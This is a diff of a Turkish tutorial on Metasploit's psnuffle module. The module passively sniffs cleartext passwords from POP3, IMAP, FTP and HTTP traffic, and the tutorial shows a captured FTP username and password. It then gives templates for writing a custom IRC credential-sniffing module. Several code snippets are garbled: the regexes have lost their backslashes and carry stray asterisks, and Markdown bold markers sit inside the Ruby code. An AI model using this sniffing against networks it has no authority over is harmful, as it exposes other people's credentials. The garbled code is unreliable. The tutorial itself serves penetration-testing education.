@@ -15,15 +15,9 @@ tags:
     - cybersecurity
     - metasploit framework
 ---
-
-
 Metasploit kullanarak, ağda bulunan pop3, imap, ftp ve HTTP protokolleri üzerinden gönderilen parolaları dinleyebilirsiniz. Bu amaçla ‘psnuffle‘ modülü bulunmaktadır.
 
-
-
 `psnuffle` modülü, neredeyse hiçbir ayarlama yapmaya gerek kalmadan kullanılabilir. İsterseniz dışarıdan PCAP dosyası ithal edebilirsiniz. Buradaki örnekte, ayarlar olduğu gibi kullanılacaktır.
-
-
 ```bash
 msf > use auxiliary/sniffer/psnuffle
 msf auxiliary(psnuffle) > show options
@@ -49,27 +43,15 @@ msf auxiliary(psnuffle) > run
 > Successful FTP Login: 192.168.1.100:21-192.168.1.5:48614 **>>** victim / pass (220 3Com 3CDaemon FTP Server Version 2.0)
 ```
 
-
-
 Gördüğünüz gibi FTP protokolünde `victim` kullanıcı adı ve `pass` parolası ortaya çıkarıldı.
-
-
 
 ## Psnuffle Özelleştirme
 
-
-
 İsterseniz, `psnuffle` aracını, varsayılan olarak dinlediği protokoller haricinde diğer protokoller için de tasarlayabilirsiniz.
-
-
 
 Bu özelleştirme işlemi için yapılacak modüller, data/exploits/psnuffle klasörünün içine kaydedilmelidir. Yeni bir modül geliştirmek için öncelikle var olan bir modülü şablon olarak kullanabiliriz.
 
-
-
 Aşağıda, POP3 modülünün Düzenli ifadeler kısmı görülmektedir. Bu düzenli ifadeler, dinleme esnasında hangi tür şablona uyan verilerin dikkate alınacağını tanımlamaktadır. Bir miktar karışık gibi görünebilir. Ancak düzenli ifadeleri öğrenmenizi tavsiye ediyoruz. Her yerde karşınıza çıkar ve öğrenirseniz, işinizi kolaylaştırırlar.
-
-
 ```bash
 self.sigs = {
 :ok => /^(+OK[^n]*****)n/si,
@@ -79,34 +61,20 @@ self.sigs = {
 :quit => /^(QUITs*****[^n]*****)n/si }
 ```
 
-
-
 ## IRC Modülü
-
-
 
 Aşağıdaki örneklerde, IRC protokolü için yazılmış bir modülde olması gerekenleri görebilirsiniz.
 
-
-
 Öncelikle, dikkate alınacak sinyal tiplerini tanımlayalım. Buradaki IRC komutlarından IDENTIFY, her IRC sunucu tarafından kullanılmamaktadır. En azında Freenode bu şekilde kullanır.
-
-
 ```bash
 self.sigs = {
 :user => /^(NICKs+[^n]+)/si,
 :pass => /b(IDENTIFYs+[^n]+)/si,}
 ```
 
-
-
 ## Oturum Tanımlama (Session)
 
-
-
 Her modül için mutlaka tanımlanması gereken kısım, hangi Portlar ile ilgileneceğidir. Bu tanımlama için aşağıdaki şablonu kullanabilirsiniz.
-
-
 ```bash
 **return if **not pkt[:tcp] # We don't want to handle anything other than tcp
 **return if** (pkt[:tcp].src_port **!=** 6667 and pkt[:tcp].dst_port **!=** 6667) # Process only packet on port 6667
@@ -119,11 +87,7 @@ s = find_session("#{pkt[:ip].src_ip}:#{pkt[:tcp].src_port}-#{pkt[:ip].dst_ip}:#{
 end
 ```
 
-
-
 Şimdi ise `self.sigs` bölümünde şablonu oluşturulan türde bir paket yakalandığında ne yapılacağını ayarlamanız gerekmekte. Bunun için de aşağıdaki şablonu kullanabilirsiniz.
-
-
 ```bash
 **case** matched
 when :user # when the pattern "/^(NICKs+[^n]+)/si" is matching the packet content
@@ -140,7 +104,5 @@ when nil
 sessions[s[:session]].merge!**({**k => matches**})** # Just add it to the session object
 end
 ```
-
-
 
 Tebrikler kendi modülünüzü yazdınız.
